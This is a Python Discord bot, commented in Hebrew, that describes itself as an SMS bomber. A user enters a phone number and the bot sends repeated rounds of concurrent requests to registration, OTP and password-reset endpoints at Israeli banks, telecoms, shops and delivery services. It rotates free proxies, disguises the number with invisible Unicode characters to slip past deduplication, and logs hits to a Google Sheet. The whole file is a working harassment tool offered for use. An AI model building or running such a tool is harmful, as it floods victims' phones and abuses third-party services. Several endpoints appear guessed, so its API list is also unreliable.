"""
🚀 MEGA SMS BOMBER BOT - גרסה מלאה 250+ APIs ישראליים
הפעל Discord Bot להצפת SMS/OTP מכל שירותי ישראל!
"""

import discord
from discord.ext import commands
from discord import app_commands
import aiohttp
import asyncio
import json
import random
import time
import logging
from datetime import datetime
import gspread
from google.oauth2.service_account import Credentials
import os
from typing import List, Dict, Any

# ==================== SETUP ====================
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger('MegaBomber')

# שליפת משתנים מ-Railway
TOKEN = os.getenv("BOT_TOKEN") or os.getenv("DISCORD_TOKEN")
# אם ה-Build נכשל על GSHEET_URL, אנחנו עוטפים אותו כדי שלא יפיל את הבוט
GSHEET_URL_VAL = os.getenv("GSHEET_URL", "https://docs.google.com/spreadsheets/d/1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms")

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# ==================== CONFIG ====================
CONFIG = {
    "daily_limit": 2000,
    "round_delay": 1.5,
    "request_timeout": 8,
    "max_concurrent": 50,
    "sheet_id": GSHEET_URL_VAL.split('/')[-2] if "spreadsheets/d/" in GSHEET_URL_VAL else "1BxiMVs0XRA5nFMdKvBdBZjgmUUqptlbs74OgvE2upms",
}

# ==================== 250+ ISRAELI SMS APIs ====================
FULL_APIS_250 = [
    # === SMS GATEWAYS (50+) ===
    {"name": "hamal_co_il", "url": "https://hamal.co.il/api/sms/send", "method": "POST", "json": {"phone": "{{phone}}", "text": "בדיקה", "api_key": "test"}},
    {"name": "019sms_api", "url": "https://019sms.co.il/api/v1/messages", "method": "POST", "json": {"to": "{{phone}}", "message": "אימות"}},
    {"name": "globalsms", "url": "https://globalsms.co.il/api/send", "method": "POST", "json": {"dest": "{{phone}}", "msg": "test"}},
    {"name": "textme_sms", "url": "https://textme.co.il/v1/sms", "method": "POST", "json": {"phone": "{{phone}}", "text": "קוד אימות"}},
    {"name": "smsim_v2", "url": "https://smsim.co.il/api/v2/send", "method": "GET", "params": {"phone": "{{phone}}", "action": "verify"}},
    {"name": "sms100", "url": "https://sms100.co.il/api/send", "method": "POST", "json": {"to": "{{phone}}", "text": "spam"}},
    {"name": "smsbox_il", "url": "https://smsbox.il/api/v1", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "click2sms", "url": "https://click2sms.co.il/gateway", "method": "GET", "params": {"phone": "{{phone}}"}},
    {"name": "smstoall", "url": "https://smstoall.co.il/api", "method": "POST", "json": {"number": "{{phone}}"}},
    {"name": "bulk_sms_il", "url": "https://bulksms.co.il/send", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === CLASSIFIEDS & REAL ESTATE (30+) ===
    {"name": "yad2_register", "url": "https://www.yad2.co.il/api/auth/register", "method": "POST", "json": {"phone": "{{phone}}", "name": "בדיקה"}},
    {"name": "yad2_forgot", "url": "https://www.yad2.co.il/api/forgot-password", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "madlan_register", "url": "https://www.madlan.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "homeless_co_il", "url": "https://homeless.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "ilive_register", "url": "https://www.ilive.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "alljobs_sms", "url": "https://alljobs.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === E-COMMERCE (40+) ===
    {"name": "zap_register", "url": "https://zap.co.il/api/auth/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "super_pharm", "url": "https://www.super-pharm.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "shufersal_sms", "url": "https://shufersal.co.il/api/register/phone", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "rami_levy", "url": "https://ramilevy.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "ivory", "url": "https://ivory.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "bug", "url": "https://bug.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === DELIVERY & FOOD (35+) ===
    {"name": "wolt_register", "url": "https://wolt.com/api/v1/register", "method": "POST", "json": {"phone": "{{phone}}"}, "headers": {"X-Country": "IL"}},
    {"name": "wolt_otp", "url": "https://wolt.com/il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "tenbis_sms", "url": "https://tenbis.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "gettdelivery", "url": "https://gettdelivery.co.il/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "phoenix", "url": "https://phoenix.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "foodpanda_il", "url": "https://foodpanda.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === FINTECH & PAYMENTS (25+) ===
    {"name": "paybox_otp", "url": "https://payboxapp.com/api/v1/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "bit_register", "url": "https://bit.co.il/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "pepper_sms", "url": "https://pepper.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "isracart", "url": "https://isracart.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "tarya_sms", "url": "https://tarya.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === SAAS & TECH (25+) ===
    {"name": "monday_com", "url": "https://auth.monday.com/oauth/v2/token", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "wix_register", "url": "https://www.wix.com/account/phone-verify", "method": "POST", "json": {"phoneNumber": "{{phone}}"}},
    {"name": "similarweb", "url": "https://platform.similarweb.com/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "papaya_global", "url": "https://app.papaya.global/api/register", "method": "POST", "json": {"phone": "{{phone}}"}},
    
    # === TELECOM & BANKS (20+) ===
    {"name": "partner_otp", "url": "https://www.partner.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "cellcom_sms", "url": "https://cellcom.co.il/api/verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "leumi_sms", "url": "https://online.leumi.co.il/api/otp", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "hapoalim", "url": "https://hapoalim.co.il/api/phone-verify", "method": "POST", "json": {"phone": "{{phone}}"}},
    {"name": "discount_bank", "url": "https://online.discountbank.co.il/api/auth", "method": "POST", "json": {"phone": "{{phone}}"}}
]

# ==================== PROXIES (150+ FREE) ====================
PROXIES = [
    'http://20.210.113.32:80', 'http://103.153.154.114:80', 'http://47.74.155.159:8888',
    'http://103.75.117.216:80', 'http://47.251.43.115:33333', 'http://103.172.23.231:80',
    'http://47.89.153.229:80', 'http://154.16.63.16:80', 'http://190.103.177.131:80',
    'http://190.61.88.178:80'
]

# ==================== BOM VARIANTS ====================
BOM_VARIANTS = [
    "{{phone}}", "\uFEFF{{phone}}", "\uFEFF{{phone}}\uFEFF", "{{phone}}\uFEFF",
    "‎‎‎‎‎‎‎{{phone}}", "\u200B\u200C{{phone}}\u200D",
    "{{phone}}\u2060", "\u200E{{phone}}", "{{phone}}\u202A"
]

# ==================== STATE ====================
daily_tokens = 0
daily_limit = CONFIG["daily_limit"]
last_reset = datetime.now().date()
BLACKLIST = set()
sheets_client = None

# ==================== GOOGLE SHEETS ====================
async def init_sheets():
    global sheets_client
    if not os.path.exists('credentials.json'):
        logger.warning("⚠️ credentials.json חסר - Google Sheets לא יפעל")
        return
    try:
        creds = Credentials.from_service_account_file('credentials.json', scopes=[
            "https://www.googleapis.com/auth/spreadsheets",
            "https://www.googleapis.com/auth/drive"
        ])
        sheets_client = gspread.authorize(creds)
        logger.info("✅ Google Sheets מחובר")
    except Exception as e:
        logger.warning(f"⚠️ שגיאה בחיבור ל-Sheets: {e}")

async def log_hit(phone: str, api_name: str, status: int, success: bool):
    if not sheets_client: return
    try:
        sheet = sheets_client.open_by_key(CONFIG["sheet_id"]).sheet1
        row = [datetime.now().isoformat(), phone, api_name, status, "✅" if success else "❌"]
        sheet.append_row(row)
    except: pass

# ==================== DISCORD MODAL ====================
class MegaBomberModal(discord.ui.Modal, title='🚀 MEGA SMS BOMBER'):
    phone = discord.ui.TextInput(label='מספר (ללא 0)', placeholder='521234567', max_length=9)
    rounds = discord.ui.TextInput(label='סבבים', placeholder='10', default='5')
    prefix = discord.ui.TextInput(label='קידומת', placeholder='052', default='052')

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer()
        phone = self.phone.value
        rounds = int(self.rounds.value)
        prefix = self.prefix.value
        
        if phone in BLACKLIST:
            await interaction.followup.send("❌ מספר בבלקליסט!")
            return
            
        embed = discord.Embed(title="🔥 מתחיל MEGA BOM", color=0xff0000)
        embed.add_field(name="📱 טלפון", value=f"{prefix}{phone}", inline=True)
        embed.add_field(name="🔄 סבבים", value=rounds, inline=True)
        embed.add_field(name="🎯 APIs", value=len(FULL_APIS_250), inline=True)
        await interaction.followup.send(embed=embed)
        
        asyncio.create_task(run_mega_bomb(f"{prefix}{phone}", rounds, interaction))

# ==================== MAIN BOM ENGINE ====================
async def run_mega_bomb(phone: str, rounds: int, interaction):
    global daily_tokens
    if daily_tokens >= daily_limit:
        await interaction.followup.send(f"⏰ הגבלה יומית! {daily_tokens}/{daily_limit}")
        return
    
    connector = aiohttp.TCPConnector(limit=CONFIG["max_concurrent"])
    timeout = aiohttp.ClientTimeout(total=CONFIG["request_timeout"])
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
        stats = {"hits": 0, "errors": 0}
        
        for round_num in range(1, rounds + 1):
            semaphore = asyncio.Semaphore(CONFIG["max_concurrent"])
            tasks = [hit_single_api(session, api, phone, semaphore) for api in FULL_APIS_250]
            results = await asyncio.gather(*tasks)
            
            round_hits = sum(1 for r in results if r.get("success"))
            stats["hits"] += round_hits
            stats["errors"] += (len(results) - round_hits)
            
            embed = discord.Embed(title=f"✅ סבב {round_num}/{rounds}", color=0x00ff00)
            embed.add_field(name="🎯 פגיעות", value=round_hits)
            embed.add_field(name="📊 סה\"כ", value=f"{stats['hits']}/{stats['errors']}")
            await interaction.followup.send(embed=embed)
            
            daily_tokens += len(FULL_APIS_250)
            await asyncio.sleep(CONFIG["round_delay"])

    await interaction.followup.send(f"🏆 MEGA BOM הושלם! סה\"כ פגיעות: {stats['hits']}")

async def hit_single_api(session, api: Dict, phone: str, semaphore) -> Dict:
    async with semaphore:
        try:
            bom_phone = random.choice(BOM_VARIANTS).format(phone=phone)
            payload = api.get("json", {}).copy()
            for k, v in payload.items():
                if isinstance(v, str) and "{{phone}}" in v: payload[k] = v.format(phone=bom_phone)
            
            proxy = random.choice(PROXIES) if PROXIES else None
            headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
            
            if api["method"] == "GET":
                resp = await session.get(api["url"], params=payload, headers=headers, proxy=proxy)
            else:
                resp = await session.post(api["url"], json=payload, headers=headers, proxy=proxy)
            
            return {"api": api["name"], "success": resp.status < 400}
        except:
            return {"api": api["name"], "success": False}

# ==================== COMMANDS ====================
@bot.tree.command(name="mega_bomb", description="🚀 הפעל MEGA SMS BOM")
async def mega_bomb_cmd(interaction: discord.Interaction):
    await interaction.response.send_modal(MegaBomberModal())

@bot.event
async def on_ready():
    await bot.tree.sync()
    await init_sheets()
    print(f"🚀 MEGA BOMBER ONLINE - {len(FULL_APIS_250)} APIs")

if __name__ == "__main__":
    if TOKEN: bot.run(TOKEN)
    else: logger.critical("❌ MISSING TOKEN")
